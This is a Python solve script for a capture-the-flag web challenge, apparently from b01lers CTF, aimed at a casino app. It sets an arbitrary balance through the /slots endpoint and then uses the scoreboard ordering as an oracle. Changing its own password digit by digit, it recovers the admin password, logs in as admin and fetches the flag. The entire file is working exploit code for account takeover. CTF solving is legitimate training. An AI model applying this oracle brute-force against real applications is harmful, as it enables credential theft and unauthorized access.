import time
import os
import requests

URL = "https://boilerscasino-712bad285a1a2ad4.instancer.b01lersc.tf"
#URL = "http://localhost:5000"
username = os.urandom(64).hex()
password = "0" * 64
digits = "0123456789abcdef"

session = requests.Session()

resp = session.post(
	URL + "/register",
	json={
	"fullname": "Captain Baccarat",
	"username": username,
	"password": password
	}
)

resp = session.post(URL + "/login", json={"username": username, "password": password})
session.cookies["jwt"] = resp.json()["jwt"]

resp = session.post(URL + "/slots", json={"change": 1000000 - 500})

init = ""
curr = list(init + "0" * (64 - len(init)))
for i in range(len(init), 64):
	for c in digits:
		time.sleep(0.3)
		curr[i] = c
		print("".join(curr))
		resp = session.post(URL + "/update_password", json={"new_password": "".join(curr)})
		
		resp = session.get(URL + "/scoreboard")
		if resp.text.find(">Captain Baccarat") == -1:
			break
		if resp.text.find(">The Real Captain Baccarat") > resp.text.find(">Captain Baccarat"):
			curr[i] = digits[digits.index(c) - 1]
			break
	else:
		curr[i] = "f"

print("".join(curr))
resp = requests.post(URL + "/login", json={"username": "admin", "password": "".join(curr)})

print(requests.get(URL + "/grab_flag", cookies={"jwt": resp.json()["jwt"]}).json()["flag"])
